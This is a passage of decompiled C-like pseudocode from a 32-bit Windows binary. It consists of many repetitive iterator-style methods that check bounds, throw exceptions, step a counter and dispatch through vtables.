    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1003E0A6) --------------------------------------------------------
int __thiscall sub_1003E0A6(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1003E0E1) --------------------------------------------------------
int __thiscall sub_1003E0E1(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1003E0FA) --------------------------------------------------------
_DWORD *__thiscall sub_1003E0FA(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10095340;
  a2[1] = this;
  *a2 = &off_10095754;
  a2[2] = a3;
  return result;
}
// 10095340: using guessed type int (__thiscall *off_10095340)(void *Block, char);
// 10095754: using guessed type int (__thiscall *off_10095754)(void *Block, char);

//----- (1003E132) --------------------------------------------------------
void *__thiscall sub_1003E132(_DWORD *this)
{
  void *result; // eax

  result = &loc_10075053;
  *this = &off_10095754;
  *this = &off_10095340;
  return result;
}
// 10095340: using guessed type int (__thiscall *off_10095340)(void *Block, char);
// 10095754: using guessed type int (__thiscall *off_10095754)(void *Block, char);

//----- (1003E15C) --------------------------------------------------------
bool __thiscall sub_1003E15C(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1003E173) --------------------------------------------------------
BOOL __thiscall sub_1003E173(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1003E17D) --------------------------------------------------------
int __thiscall sub_1003E17D(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1003E1B8) --------------------------------------------------------
int __thiscall sub_1003E1B8(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1003E1EE) --------------------------------------------------------
int __thiscall sub_1003E1EE(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1003E216) --------------------------------------------------------
int __thiscall sub_1003E216(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1003E251) --------------------------------------------------------
int __thiscall sub_1003E251(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1003E26A) --------------------------------------------------------
_DWORD *__thiscall sub_1003E26A(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_100954CC;
  a2[1] = this;
  *a2 = &off_10095774;
  a2[2] = a3;
  return result;
}
// 100954CC: using guessed type int (__thiscall *off_100954CC)(void *Block, char);
// 10095774: using guessed type int (__thiscall *off_10095774)(void *Block, char);

//----- (1003E2A2) --------------------------------------------------------
void *__thiscall sub_1003E2A2(_DWORD *this)
{
  void *result; // eax

  result = &loc_1007502F;
  *this = &off_10095774;
  *this = &off_100954CC;
  return result;
}
// 100954CC: using guessed type int (__thiscall *off_100954CC)(void *Block, char);
// 10095774: using guessed type int (__thiscall *off_10095774)(void *Block, char);

//----- (1003E2CC) --------------------------------------------------------
bool __thiscall sub_1003E2CC(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1003E2E3) --------------------------------------------------------
BOOL __thiscall sub_1003E2E3(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1003E2ED) --------------------------------------------------------
int __thiscall sub_1003E2ED(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1003E328) --------------------------------------------------------
int __thiscall sub_1003E328(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1003E35E) --------------------------------------------------------
int __thiscall sub_1003E35E(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1003E386) --------------------------------------------------------
int __thiscall sub_1003E386(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1003E3C1) --------------------------------------------------------
int __thiscall sub_1003E3C1(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1003E3DA) --------------------------------------------------------
_DWORD *__thiscall sub_1003E3DA(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10095360;
  a2[1] = this;
  *a2 = &off_10095794;
  a2[2] = a3;
  return result;
}
// 10095360: using guessed type int (__thiscall *off_10095360)(void *Block, char);
// 10095794: using guessed type int (__thiscall *off_10095794)(void *Block, char);

//----- (1003E412) --------------------------------------------------------
void *__thiscall sub_1003E412(_DWORD *this)
{
  void *result; // eax

  result = &loc_1007500B;
  *this = &off_10095794;
  *this = &off_10095360;
  return result;
}
// 10095360: using guessed type int (__thiscall *off_10095360)(void *Block, char);
// 10095794: using guessed type int (__thiscall *off_10095794)(void *Block, char);

//----- (1003E43C) --------------------------------------------------------
bool __thiscall sub_1003E43C(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1003E453) --------------------------------------------------------
BOOL __thiscall sub_1003E453(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1003E45D) --------------------------------------------------------
int __thiscall sub_1003E45D(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1003E498) --------------------------------------------------------
int __thiscall sub_1003E498(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1003E4CE) --------------------------------------------------------
int __thiscall sub_1003E4CE(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1003E4F6) --------------------------------------------------------
int __thiscall sub_1003E4F6(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1003E531) --------------------------------------------------------
int __thiscall sub_1003E531(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1003E54A) --------------------------------------------------------
_DWORD *__thiscall sub_1003E54A(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10095584;
  a2[1] = this;
  *a2 = &off_100957B4;
  a2[2] = a3;
  return result;
}
// 10095584: using guessed type int (__thiscall *off_10095584)(void *Block, char);
// 100957B4: using guessed type int (__thiscall *off_100957B4)(void *Block, char);

//----- (1003E582) --------------------------------------------------------
void *__thiscall sub_1003E582(_DWORD *this)
{
  void *result; // eax

  result = &loc_10074FE7;
  *this = &off_100957B4;
  *this = &off_10095584;
  return result;
}
// 10095584: using guessed type int (__thiscall *off_10095584)(void *Block, char);
// 100957B4: using guessed type int (__thiscall *off_100957B4)(void *Block, char);

//----- (1003E5AC) --------------------------------------------------------
bool __thiscall sub_1003E5AC(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1003E5C3) --------------------------------------------------------
BOOL __thiscall sub_1003E5C3(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1003E5CD) --------------------------------------------------------
int __thiscall sub_1003E5CD(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1003E608) --------------------------------------------------------
int __thiscall sub_1003E608(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1003E63E) --------------------------------------------------------
int __thiscall sub_1003E63E(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1003E666) --------------------------------------------------------
int __thiscall sub_1003E666(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1003E6A1) --------------------------------------------------------
int __thiscall sub_1003E6A1(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1003E6BA) --------------------------------------------------------
_DWORD *__thiscall sub_1003E6BA(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_100955A4;
  a2[1] = this;
  *a2 = &off_100957D4;
  a2[2] = a3;
  return result;
}
// 100955A4: using guessed type int (__thiscall *off_100955A4)(void *Block, char);
// 100957D4: using guessed type int (__thiscall *off_100957D4)(void *Block, char);

//----- (1003E6F2) --------------------------------------------------------
void *__thiscall sub_1003E6F2(_DWORD *this)
{
  void *result; // eax

  result = &loc_10074FC3;
  *this = &off_100957D4;
  *this = &off_100955A4;
  return result;
}
// 100955A4: using guessed type int (__thiscall *off_100955A4)(void *Block, char);
// 100957D4: using guessed type int (__thiscall *off_100957D4)(void *Block, char);

//----- (1003E71C) --------------------------------------------------------
bool __thiscall sub_1003E71C(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1003E733) --------------------------------------------------------
BOOL __thiscall sub_1003E733(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1003E73D) --------------------------------------------------------
int __thiscall sub_1003E73D(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1003E778) --------------------------------------------------------
int __thiscall sub_1003E778(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1003E7AE) --------------------------------------------------------
int __thiscall sub_1003E7AE(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1003E7D6) --------------------------------------------------------
int __thiscall sub_1003E7D6(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1003E811) --------------------------------------------------------
int __thiscall sub_1003E811(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1003E82A) --------------------------------------------------------
_DWORD *__thiscall sub_1003E82A(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_1009565C;
  a2[1] = this;
  *a2 = &off_100957F4;
  a2[2] = a3;
  return result;
}
// 1009565C: using guessed type int (__thiscall *off_1009565C)(void *Block, char);
// 100957F4: using guessed type int (__thiscall *off_100957F4)(void *Block, char);

//----- (1003E862) --------------------------------------------------------
void *__thiscall sub_1003E862(_DWORD *this)
{
  void *result; // eax

  result = &loc_10074F9F;
  *this = &off_100957F4;
  *this = &off_1009565C;
  return result;
}
// 1009565C: using guessed type int (__thiscall *off_1009565C)(void *Block, char);
// 100957F4: using guessed type int (__thiscall *off_100957F4)(void *Block, char);

//----- (1003E88C) --------------------------------------------------------
bool __thiscall sub_1003E88C(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1003E8A3) --------------------------------------------------------
BOOL __thiscall sub_1003E8A3(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1003E8AD) --------------------------------------------------------
int __thiscall sub_1003E8AD(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1003E8E8) --------------------------------------------------------
int __thiscall sub_1003E8E8(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1003E91E) --------------------------------------------------------
int __thiscall sub_1003E91E(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1003E946) --------------------------------------------------------
int __thiscall sub_1003E946(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1003E981) --------------------------------------------------------
int __thiscall sub_1003E981(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1003E99A) --------------------------------------------------------
_DWORD *__thiscall sub_1003E99A(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_1009567C;
  a2[1] = this;
  *a2 = &off_10095814;
  a2[2] = a3;
  return result;
}
// 1009567C: using guessed type int (__thiscall *off_1009567C)(void *Block, char);
// 10095814: using guessed type int (__thiscall *off_10095814)(void *Block, char);

//----- (1003E9D2) --------------------------------------------------------
void *__thiscall sub_1003E9D2(_DWORD *this)
{
  void *result; // eax

  result = &loc_10074F7B;
  *this = &off_10095814;
  *this = &off_1009567C;
  return result;
}
// 1009567C: using guessed type int (__thiscall *off_1009567C)(void *Block, char);
// 10095814: using guessed type int (__thiscall *off_10095814)(void *Block, char);

//----- (1003E9FC) --------------------------------------------------------
bool __thiscall sub_1003E9FC(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1003EA13) --------------------------------------------------------
BOOL __thiscall sub_1003EA13(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1003EA1D) --------------------------------------------------------
int __thiscall sub_1003EA1D(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1003EA58) --------------------------------------------------------
int __thiscall sub_1003EA58(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1003EA8E) --------------------------------------------------------
int __thiscall sub_1003EA8E(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1003EAB6) --------------------------------------------------------
int __thiscall sub_1003EAB6(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1003EAF1) --------------------------------------------------------
int __thiscall sub_1003EAF1(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1003EB0A) --------------------------------------------------------
_DWORD *__thiscall sub_1003EB0A(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_100956D4;
  a2[1] = this;
  *a2 = &off_10095834;
  a2[2] = a3;
  return result;
}
// 100956D4: using guessed type int (__thiscall *off_100956D4)(void *Block, char);
// 10095834: using guessed type int (__thiscall *off_10095834)(void *Block, char);

//----- (1003EB42) --------------------------------------------------------
void *__thiscall sub_1003EB42(_DWORD *this)
{
  void *result; // eax

  result = &loc_10074F57;
  *this = &off_10095834;
  *this = &off_100956D4;
  return result;
}
// 100956D4: using guessed type int (__thiscall *off_100956D4)(void *Block, char);
// 10095834: using guessed type int (__thiscall *off_10095834)(void *Block, char);

//----- (1003EB6C) --------------------------------------------------------
bool __thiscall sub_1003EB6C(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1003EB83) --------------------------------------------------------
BOOL __thiscall sub_1003EB83(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1003EB8D) --------------------------------------------------------
int __thiscall sub_1003EB8D(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1003EBC8) --------------------------------------------------------
int __thiscall sub_1003EBC8(int this)
{
  int v2; // edi
